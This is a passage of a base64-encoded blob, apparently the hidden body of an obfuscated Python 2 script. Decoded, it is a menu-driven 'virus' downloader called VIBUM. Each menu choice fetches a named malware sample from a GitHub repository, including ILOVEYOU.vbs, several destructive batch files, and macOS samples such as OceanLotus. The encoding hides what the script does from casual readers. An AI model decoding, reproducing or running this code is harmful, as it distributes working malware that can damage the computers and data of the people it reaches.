ZXB5JXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzVSVzKSVzZ2x5JXNcbicgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXMwJXMpICVzQmFjayB0byBtYWluIG1lbnUlc1xuJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCWNob29zZV92aXJ1cyA9IHJhd19pbnB1dCgnJXNWSUJVTSAlcz4gJXN3aW52aW1hJXMgJyAlIChSLCBZLCBHLCBZKSkNCgkJCWlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdyJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL1JJUC5iYXQiLCJSSVAuYmF0IikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ2knOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvSUxPVkVZT1UudmJzIiwiSUxPVkVZT1UudmJzIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ3AnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvUENULmJhdCIsIlBDVC5iYXQiKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMubG93ZXIoKSA9PSAnayc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9rb2NlLmJhdCIsIktPQ0UuYmF0IikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ3JlJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL3JlZ2VhdGVyLmJhdCIsInJlZ2VhdGVyLmJhdCIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdjJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL2NtZC5iYXQiLCJDTUQuYmF0IikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJzQnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvNDA0LmJhdCIsIjQwNC5iYXQiKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMubG93ZXIoKSA9PSAnYSc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9hbGF5LnZicyIsImFsYXkudmJzIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ2NhJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL2NhcHNsb2NrLnZicyIsImNhcHNsb2NrLnZicyIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdrdSc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9rdWlzLmJhdCIsImt1aXMuYmF0IikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ3MnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvc2xlZXB5LmJhdCIsInNsZWVweS5iYXQiKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMubG93ZXIoKSA9PSAndSc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci91Z2x5LmJhdCIsInVnbHkuYmF0IikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzID09ICcwJzoNCgkJCQlwYXNzDQoJCQllbHNlOg0KCQkJCXByaW50ICclc1slcyElc10lcyBFUlJPUiVzOiVzIFdyb25nIElucHV0Li4uJXMnICUgKFksIFIsIFksIFIsIFksIEcsIE4pDQoJCQkJdGltZS5zbGVlcCgyKQ0KCQllbGlmIG9wc2kuc3RyaXAoKSBpbiAoJzAzIDMnKS5zcGxpdCgpOg0KCQkJbWFjdmltYSgpDQoJCQlwcmludCgnJXNbJXMqJXNdICVzTGlzdCBvZiBWaXJ1cyVzJyAlIChZLCBSLCBZLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc1Qlcyklc3Jpbm9pZHMlcycgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNPJXMpJXNjZWFuTG90dXMlcycgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNOJXMpJXNvdGhpbmclc1xuJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglczAlcykgJXNCYWNrIHRvIG1haW4gbWVudSVzXG4nICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJY2hvb3NlX3ZpcnVzID0gcmF3X2lucHV0KCclc1ZJQlVNICVzPiAlc21hY3ZpbWElcyAnICUgKFIsIFksIEcsIFkpKQ0KCQkJaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ3QnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMuLi4lcycgJSAoWSwgUiwgWSwgRywgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL3RyaW5vaWRzLmFwcCIsInRyaW5vaWRzLmFwcCIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdvJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzLi4uJXMnICUgKFksIFIsIFksIEcsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9PY2VhbkxvdHVzLnppcCIsIk9jZWFuTG90dXMuemlwIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ24nOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMuLi4lcycgJSAoWSwgUiwgWSwgRywgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL25vdGhpbmcuYXBwIiwibm90aGluZy5hcHAiKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMgPT0gJzAnOg0KCQkJCXBhc3MNCgkJCWVsc2U6DQoJCQkJcHJpbnQgJyVzWyVzISVzXSVzIEVSUk9SJXM6JXMgV3JvbmcgSW5wdXQuLi4lcycgJSAoWSwgUiwgWSwgUiwgWSwgRywgTikNCgkJCQl0aW1lLnNsZWVwKDIpDQoJCWVsaWYgb3BzaS5zdHJpcCgpIGluICgnMDQgNCcpLnNwbGl0KCk6DQoJCQljbGVhcigpDQoJCQlyZXN0YXJ0X3Byb2dyYW0oKQ0KCQllbGlmIG9wc2kuc3RyaXAoKSBpbiAoJzA1IDUnKS5zcGxpdCgpOg0KCQkJcHJpbnQgJyVzJyAlIE4NCgkJCXN5cy5leGl0KCkNCgkJZWxzZToNCgkJCXByaW50ICclc1slcyElc10lcyBFUlJPUiVzOiVzIFdyb25nIElucHV0Li4uJXMnICUgKFksIFIsIFksIFIsIFksIEcsIE4pDQoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OiBwcmludCAnJXNbJXMhJXNdJXMgRVJST1IlczolcyBDVFJMK0MgRGV0ZWN0ZWQuLi4gZm9yY2UgY2xvc2UgdGhlIHByb2dyYW0uLi4lcycgJSAoWSwgUiwgWSwgUiwgWSwgRywgTik7YnJlYWsNCglleGNlcHQgRU9GRXJyb3I6IHByaW50ICdcbiVzWyVzISVzXSVzIEVSUk9SJXM6JXMgQ1RSTCtEIERldGVjdGVkLi4uIGZvcmNlIGNsb3NlIHRoZSBwcm9ncmFtLi4uJXMnICUgKFksIFIsIFksIFIsIFksIEcsIE4pO2JyZWFrDQoJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiBwcmludCAnICVzWyVzISVzXSVzIEVSUk9SJXM6JXMgRGV2aWNlIGlzIG5vdCBjb25uZWN0ZWQgdG8gdGhlIGludGVybmV0Li4uJXMnICUgKFksIFIsIFksIFIsIFksIEcsIE4p'))